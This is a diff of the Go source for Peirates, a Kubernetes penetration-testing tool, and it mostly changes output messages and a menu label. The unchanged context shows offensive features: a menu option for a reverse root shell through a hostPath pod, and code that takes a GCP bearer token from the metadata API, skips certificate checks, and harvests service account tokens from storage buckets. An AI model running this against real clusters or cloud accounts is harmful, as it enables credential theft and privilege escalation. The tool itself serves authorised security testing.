@@ -863,7 +863,7 @@ func banner(connectionString ServerInfo) {
 ,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 ________________________________________
-  Peirates v1.0.11 by InGuardians
+	Peirates v1.0.12 by InGuardians
   https://www.inguardians.com/peirates
 ----------------------------------------------------------------`)
 
@@ -1661,7 +1661,7 @@ Compromise |
 -----------+
 [20] Gain a reverse rootshell by launching a hostPath / pod
 [21] Run command in one or all pods in this namespace
-[22] Get a list of pods from the Kubelet [not yet implemented]
+[22] Run a command on a pod from the Kubelet
 
 [exit] Exit Peirates 
 ----------------------------------------------------------------
@@ -2002,10 +2002,10 @@ Peirates:># `)
 
 			token := GetGCPBearerTokenFromMetadataAPI("default")
 			if token == "ERROR" {
-				println("ERROR: Could not get GCP default token from metadata API")
+				println("[-] Could not get GCP default token from metadata API")
 				break
 			} else {
-				println("Got default token for GCP - preparing to use it for GCS: ", token)
+				println("[+] Got default token for GCP - preparing to use it for GCS:", token)
 			}
 			// Need to get project ID from metadata API
 			client := &http.Client{}
@@ -2021,7 +2021,7 @@ Peirates:># `)
 			body, err := ioutil.ReadAll(resp_projid.Body)
 			// Parse result as one or more accounts, then construct a request asking for each account's credentials
 			project_id := string(body)
-			println("Got numberic project ID", project_id)
+			println("[+] Got numberic project ID", project_id)
 
 			// Prepare to do non-cert-checking https requests
 			tr := &http.Transport{
@@ -2059,7 +2059,7 @@ Peirates:># `)
 			// In every bucket URL, look at the objects
 			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
 			for _, line := range bucket_urls {
-				println("Checking bucket for credentials: ", line)
+				println("Checking bucket for credentials:", line)
 				url_list_objects := line + "/o"
 				req_list_objects, err := http.NewRequest("GET", url_list_objects, nil)
 				req_list_objects.Header.Add("Metadata-Flavor", "Google")
@@ -2090,7 +2090,7 @@ Peirates:># `)
 							// Find the substring that tells us this service account token's name
 							start := strings.LastIndex(object_url, "%2F") + 3
 							service_account_name := object_url[start:]
-							println("Getting service account for ", service_account_name)
+							println("\n[+] Getting service account for:", service_account_name)
 
 							// Get the contents of the bucket to get the service account token
 							sa_token_url := object_url + "?alt=media"
